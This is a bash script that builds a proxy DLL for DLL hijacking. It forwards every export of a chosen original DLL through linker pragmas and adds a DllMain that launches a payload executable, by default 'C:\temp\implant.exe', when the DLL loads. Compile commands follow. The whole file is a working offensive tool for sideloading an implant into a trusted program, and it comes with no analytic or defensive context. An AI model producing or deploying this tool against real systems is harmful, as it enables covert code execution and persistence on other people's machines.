

#!/bin/bash

# Advanced script for creating proxy DLLs
# Features:
# -d: Specify target DLL
# -f: Auto-generate DEF file
# -o: Output file name
# -p: Specify payload path

show_help() {
    echo "Usage: $0 -d <original_dll> [-f] [-o output_file] [-p payload_path] functions_file"
    echo "Options:"
    echo "  -d <dll_path>   Path to original DLL (required)"
    echo "  -f              Auto-generate DEF file"
    echo "  -o <output>     Output file name (default: <dllname>_proxy.c)"
    echo "  -p <payload>    Path to payload executable (default: C:\\\\temp\\\\implant.exe)"
    exit 0
}

# Default variables
ORIGINAL_DLL=""
OUTPUT_FILE=""
BACKSLASH_MODE=0
GENERATE_DEF=0
PAYLOAD_PATH="C:\\\\temp\\\\implant.exe"

# Process arguments
while getopts "d:o:p:fh" opt; do
    case $opt in
        d) ORIGINAL_DLL="${OPTARG}"
           # Check if path contains spaces
           if [[ "$ORIGINAL_DLL" == *" "* ]]; then
               BACKSLASH_MODE=1
           fi;;
        o) OUTPUT_FILE="${OPTARG}";;
        p) PAYLOAD_PATH="${OPTARG//\//\\\\}";;  # Convert forward slashes to backslashes
        f) GENERATE_DEF=1;;
        h) show_help;;
        *) echo "Error: Invalid option" >&2; exit 1;;
    esac
done
shift $((OPTIND-1))

# Validate required arguments
if [ -z "$ORIGINAL_DLL" ] || [ $# -ne 1 ]; then
    echo "Error: Required arguments not specified" >&2
    show_help
fi

FUNCTIONS_FILE=$1
DLL_BASENAME=$(basename "$ORIGINAL_DLL" .dll)

# Set default output filename if not specified
if [ -z "$OUTPUT_FILE" ]; then
    OUTPUT_FILE="${DLL_BASENAME}_proxy.c"
fi

# Function to properly format paths
format_path() {
    local path=$1
    if [ $BACKSLASH_MODE -eq 1 ]; then
        # Replace all single backslashes with double backslashes
        echo "$path" | sed 's/\\/\\\\/g'
    else
        echo "$path"
    fi
}

# Function to create export lines
create_export_line() {
    local func=$1
    local ordinal=$2
    local path=$(format_path "$ORIGINAL_DLL")

    if [ $BACKSLASH_MODE -eq 1 ]; then
        echo "#pragma comment(linker, \"\\\"/export:$func=$path.$func,@$ordinal\\\"\")"
    else
        echo "#pragma comment(linker, \"/export:$func=$path.$func,@$ordinal\")"
    fi
}

# Generate output file
{
    # File header
    cat << EOF
// Auto-generated proxy DLL
// Forwarding exports from $ORIGINAL_DLL

#include <windows.h>

// Forwarded exports
EOF

    # Process functions and create exports
    grep '@' "$FUNCTIONS_FILE" | while read -r line; do
        func=$(echo "$line" | awk '{print $1}')
        ordinal=$(echo "$line" | awk -F'@' '{print $2}')
        create_export_line "$func" "$ordinal"
    done

    # DLL main body
    cat << EOF

void Go(void) {
    STARTUPINFO info = {sizeof(info)};
    PROCESS_INFORMATION processInfo;

    CreateProcess(
        "$(format_path "$PAYLOAD_PATH")",
        "", NULL, NULL, TRUE, 0, NULL, NULL,
        &info, &processInfo);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        Go();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
EOF
} > "$OUTPUT_FILE"

# Generate DEF file if requested
if [ $GENERATE_DEF -eq 1 ]; then
    DEF_FILE="${DLL_BASENAME}_proxy.def"
    {
        echo "LIBRARY ${DLL_BASENAME}_proxy.dll"
        echo "EXPORTS"
        grep '@' "$FUNCTIONS_FILE" | while read -r line; do
            func=$(echo "$line" | awk '{print $1}')
            ordinal=$(echo "$line" | awk -F'@' '{print $2}')
            echo "    $func=$(format_path "$ORIGINAL_DLL").$func @$ordinal"
        done
    } > "$DEF_FILE"
    echo "DEF file created: $DEF_FILE"
fi

echo "Proxy file successfully created: $OUTPUT_FILE"
echo "Compile using:"
if [ $GENERATE_DEF -eq 1 ]; then
    echo "x86_64-w64-mingw32-g++ -shared -o example.dll $OUTPUT_FILE -Wl,--def=$DEF_FILE"
else
    echo "x86_64-w64-mingw32-g++ -shared -o example.dll $OUTPUT_FILE"
fi

